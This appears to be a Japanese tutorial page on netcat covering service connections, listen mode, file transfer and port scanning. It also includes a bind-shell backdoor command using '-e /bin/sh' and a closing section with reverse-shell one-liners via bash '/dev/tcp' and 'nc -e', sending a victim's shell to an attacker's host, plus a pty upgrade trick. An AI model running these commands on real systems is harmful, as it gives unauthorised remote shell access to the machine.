# ncコマンド
- ncコマンドは、接続先IPアドレス、もしくはホスト名とポート番号を指定することにより、その接続先に指定したポートで待ち受けているサービスと通信することができるコマンド
- ポートの開放状態を確認することができるので、いわばポートの疎通確認（ポートスキャン）ができる。例えば、Webサーバーへの疎通を確認したいとき、PingではNWが繋がるかどうかを確認できるが、tcp80や443が開放されているかというところまでは確認できない。しかしながらncコマンドでは、tcpの80や443が開いているかを確認することができる。（下図参照）
- Listenモード/リッスンモードを利用すれば、指定したポート番号を待ち受け、接続してきたクライアントと通信することも可能。
- ncコマンドは、NetCatの略であり、コマンドの構文も、nc、ncat、netcatと環境によって色々と使うことができる。
![image](uploads/01731af3acde8cb1309558f964acfc87/image.png)  

# サービスとの通信
### 基本的な使い方  
`nc [ip or host] [port]`

- 接続先の指定はホスト名でもIPアドレスでもどちらでも良く、ポート番号は、接続先ホストで稼働しているポート番号を指定する。デフォルトではTCPのポートに接続され、接続後は対話型でサービスと通信することができる。
- 下図は、Webサーバー（TCP/80番ポート）に接続した例である。この例は、
  - ホスト名「pc-shio-rh71」というWebサーバーのTCP80番ポートに接続を要求し、
  - 接続後、「HEAD / HTTP/1.0」というWebサーバーのHTTPヘッダ情報を要求するHTTPリクエストをWebサーバーに投げ、
  - 「HTTP/1.1 200 OK」以降に、WebサーバーからHTTPヘッダ情報がレスポンスされている例である。

![image](uploads/339d9aa03833338051b2938ca78a7f6a/image.png)  
  
- このようにNetCatでサーバーなどと接続することで、サーバーでもサービスと直接会話することができるため、文字ベースのプロトコルのテストや、サービスの稼働状況のチェック等、さまざまな局面で利用することが考えられる

# Listenモード/リッスンモード
- NetCatは、先に示した接続先に対し指定したポート（サービス）で接続することができる基本的な使い方のほかに、Listenモードと呼ばれるモードがある。
- これは反対に指定したポートで接続を待ち受けるモードである。要は、自ホストのポートを自ら開放し相手からの接続を待ち受ける、いわばサーバーのような形で機能させることができるといったモードである。
- 以下はサンプルコマンドラインである。
`nc -l -p [ip or host] [port]`
### -lオプション
- listenモードで起動するオプション
### -pオプション
- 待ち受ける（Listenする）ポート番号（デフォルトではTCP）を指定するオプション
- 「ｰp」オプションで指定しない場合は、空いているポートが自動的に選択される。

### Listenモード起動例
下図は、Host-AでListenモードを起動し、TCPポート1234で待ち受けてるところに、Host-BからNetCatを使って接続したことを表している。  
![image](uploads/bb6f8b35beb25174c8b5863a4e11d376/image.png)  
  
Host-Bの端末上で「aaaaa」という文字列を入力すると、NetCat同士の通信を経由してHost-Aに送られ、Host-Aの端末上に表示される。反対にHost-A上で入力した文字列「bbbbb」は、Host-B上に表示される。通信が終了する際は、いずれかの端末上で「Ctrl-C」を入力すればよい。  
  
# NetCatを使ったファイル転送
### ファイル送信側
`nc -lp [port] < [保存したいファイル名]`  
  
> 空いてるポートで待ち受ける  

  
### ファイル受信側  
`nc [ip or host] [port] > [送信するファイル名]`  
    
> 送信するファイルは、テキストファイルに限らず、バイナリファイルなども送ることができる。
> NetCatを用いたファイル転送は、このように非常に手軽行うことができるため、ネットワークアクセスが制限されている環境下でも大変便利である。
> ただし、NetCatは単純な通信機能した持っていないため、相手の認証や通信データの暗号化は行われないので注意が必要

# バックドアにも使える「-e」オプション
> ローカルコンピュータ上でのNetCatに対する入力、あるいはNetCatからの出力は、通常、標準入出力機器（キーボードやモニター）に割り当てられるのがデフォルトであるが、「-e」オプションを指定することで、入出力先を他のプログラムにリダイレクトすることができる。
> 例えば、下記のようにListenモードをTCPポート1234番で起動し、入出力を「/bin/sh」にリダイレクトするように指定することで、このホストのTCP/1234通信で行われる入出力は全て「/bin/sh」にリダイレクトされることになる。つまり、リモートでこのホストのTCP/1234に接続するユーザは、このホスト上で動作するシェルを自由に使うことができるということになる。  
  
`nc -l -p 1234 -e /bin/sh`  
  
> 下図は、Host-Aが「-e /bin/sh」付きのListenモードを起動しているところに、Host-Bが接続し、「uname」コマンドでHost-Aの情報を表示させているところを表している。
> この際のユーザ権限は、Listenモードを起動したHost-Aのユーザ権限と等しくなる。  
  
![image](uploads/5888775eb610bbdf646a099cefc7fd2f/image.png)  
  
> このようにNetCatは、正規のログイン手続きを踏まずに、NW経由でシェルにアクセスできるようなバックドアを作ることが可能となる。
> NetCatには、ユーザ認証機能がないため、第三者がそのホストの当該ポートに接続できる可能性があることが非常に危険である。
> 最低限不正接続リスクを低減させるためListenモードでは、接続してくるホストのIPアドレス及びポート番号を指定することができる。下記のように指定することで、接続元IPアドレス以外からの接続要求は拒否される。また、正しい接続元IPアドレスであっても、ポート番号が異なればやはり拒否される。  
  
`nc -l -p 1234 -e /bin/sh [接続先IP] [port]` 

# ポートスキャン
> これまでは、NetCatを使って相手と通信する色々な方法を述べてきたが、NetCatは、ポートスキャンできるオプションがある。  
  
`nc -z -v [IP or host] [port]`   
  
### -zオプション
- ここで「ｰz」オプションは、「ゼロI/Oモード」というモードを指定するオプションで、この「ゼロI/Oモード」とは、TCPの場合、相手先のポートに接続した後、すぐに接続を切断する。
- UDPでは、相手のポートにパケットを送り、一定時間反応を待った後に処理を終了するといったモードのことで、実際のデータ通信を行わないのが特徴。
- NmapでいうところのSYNスキャンに近いモードである。
　　
### -vオプション
- 一般的なUNIXコマンドのそれと同じく「verbose（多弁）」を意味するオプションで、接続の可否や、名前解決結果など、詳細な情報を表示するオプションである。
- ポートスキャン時に指定するポート番号は、単一の番号のみならず、スベースで区切って複数の番号を列挙することも可能で、また連続した範囲であれば、「1-1023」のようにハイフンで区切って指定することもできる。
- 下図にホスト名「pc-shio-rh71」に対して、ポート番号１から１０２３までの範囲でTCPポートスキャンを実行した結果を示す。開い
　ているポートは、「open」と表示されているのがわかる。ただし、NetCatはそもそもポートスキャン専用ソフトウェアではないため、多数のポートを連続して高速スキャンするのには向いておらず、ポートの開閉状況やフィルタリング状況を、確認したいポートを個別に実行するといった使い方が適している。  
  
![image](uploads/930ed9225b02c6cb3ef01f8434162181/image.png)  
  
- UDPポートスキャンを行う場合は、「-u」オプションを指定する。
`nc -z -v -u [IP or host] [port]` 

# リバースシェル
## bashの場合
### 攻撃者側（EC2）
#### 指定したポート番号で待ち受け状態
`nc -vnlp <待ち受けるport>`

#### オプション説明
- v 詳細な出力
- l リスニング
- n 名前解決無効
- p ポート

### 被害者側（ローカル）
#### シェルの入力と出力をリモートサーバーへのTCP接続にリダイレクトする
`bash -i > /dev/tcp/<EC2のIP>/<相手のlisten port 2>&1　0>&1`  
`bash -i >& /dev/tcp/<EC2のIP>/<相手のlisten port 0>&1`  
※どちらでもよい  

- bash: 新しいBashシェルを起動する
- -i：シェルを対話型にし、ユーザーがコマンドを入力できるようにする。
- >&：標準出力（stdout）と標準エラー（stderr）の両方を指定された場所にリダイレクトする。
- /dev/tcp/<EC2のIP>/<listen port>: stdoutとstderrをリダイレクトする場所を指定する。この場合、8000番ポートのIPアドレスのリモートサーバへのTCP接続にリダイレクトされます。
- 0>&1：標準入力（stdin）をstdoutとstderrと同じ場所にリダイレクトし、ユーザーが同じTCP接続を通じてコマンドを入力できるようにします。
- EC2側からローカルの情報が見放題・・・おそろしや

## ncコマンド/netcatの場合

### 攻撃者側（EC2）
#### 指定したポート番号で待ち受け状態
`nc -vnlp <待ち受けるport>`  
  
### 被害者側（ローカル）
#### シェルの入力と出力をリモートサーバーへのTCP接続にリダイレクトする
`nc -nv <EC2のIP> <Port> -e /bin/bash`  

- -v 接続できた旨のメッセージが出力

### おまけ
`python3 -c "import pty; pty.spawn('/bin/bash')"`  

シャルの整形
